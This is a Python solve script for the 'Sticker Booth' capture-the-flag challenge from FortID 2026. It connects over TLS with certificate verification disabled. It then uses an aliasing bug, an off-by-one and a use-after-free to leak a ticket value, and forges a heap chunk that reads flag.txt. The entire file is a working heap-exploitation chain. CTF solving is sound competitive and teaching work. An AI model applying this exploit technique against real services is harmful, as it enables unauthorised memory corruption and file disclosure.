#!/usr/bin/env python3
# Sticker Booth (FortiD 2026) remote exploit client.
#
# Same two-phase chain as the local proof, over TLS:
#   Phase 1: photo/caption alias, mono off-by-one, remove (UAF),
#            upload reuse, builtin, print b leaks the booth_ticket.
#   Phase 2 (same connection, same process, same ticket):
#            remove c, upload d (type2 header + ticket + "flag.txt"),
#            print b triggers the special path, flag is dumped to stdout.
#
# Usage:
#   python3 solve.py [host] [port]
import re
import socket
import ssl
import sys

HOST = 'sticker-booth-<...>.inst18.ctf.fortid.com'
PORT = 1337

HEX8 = '0102030405060708'
TEXT = 'A' * 16
PAD = '00' * 24
HEAD = b'\x01\x00\x02\x01\x10\x00\x00\x00'  # blk2 head marker inside the leak
END_MARK = b'x: <3\n'                        # end of a print cycle


def recv_until(sock, marker, timeout=10):
    data = b''
    sock.settimeout(timeout)
    try:
        while marker not in data:
            chunk = sock.recv(65536)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    return data


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else PORT

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    raw = socket.create_connection((host, port), timeout=15)
    s = ctx.wrap_socket(raw, server_hostname=host)

    banner = recv_until(s, END_MARK)
    print('[banner]', repr(banner[:80]))

    # --- phase 1: leak the ticket ---
    r1 = (
        'photo p 2 1 ' + HEX8 + '\n'
        'caption a ' + TEXT + '\n'
        'caption b ' + TEXT + '\n'
        'mono p\n'
        'remove a\n'
        'upload c 0000010020000000' + PAD + '\n'
        'builtin x heart\n'
        'print\n'
    )
    s.sendall(r1.encode())
    out1 = recv_until(s, END_MARK)
    if HEAD not in out1:
        sys.exit('ticket leak pattern not found; output head: %r' % out1[:300])
    i = out1.find(HEAD)
    ticket = out1[i + len(HEAD):i + len(HEAD) + 8]
    print('[ticket]', ticket.hex())

    # --- phase 2: rebuild the chunk with the real ticket and path ---
    payload_hex = '00000201' + '08000000' + ticket.hex() + '666c61672e747874' + '00' * 8
    r2 = (
        'remove c\n'
        'upload d ' + payload_hex + '\n'
        'print\n'
    )
    s.sendall(r2.encode())
    out2 = recv_until(s, END_MARK, timeout=15)
    s.close()

    text = out2.decode('utf-8', 'replace')
    print(text)
    m = re.search(r'FortID\{[^}]*\}', text)
    if m:
        print('FLAG:', m.group(0))
    else:
        print('FLAG NOT FOUND')
        sys.exit(1)


if __name__ == '__main__':
    main()